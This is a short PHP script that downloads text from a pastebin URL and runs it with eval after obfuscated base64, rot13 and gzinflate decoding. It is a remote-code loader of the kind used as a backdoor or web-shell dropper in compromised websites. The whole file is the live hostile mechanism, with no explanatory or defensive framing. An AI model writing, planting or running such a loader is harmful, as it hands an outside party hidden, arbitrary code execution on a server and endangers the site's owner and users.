<?php 

$dog= file_get_contents('https://pastebin.com/raw/p3tnMNJX');
eval(str_rot13(gzinflate(str_rot13(base64_decode(($dog))))));
?>
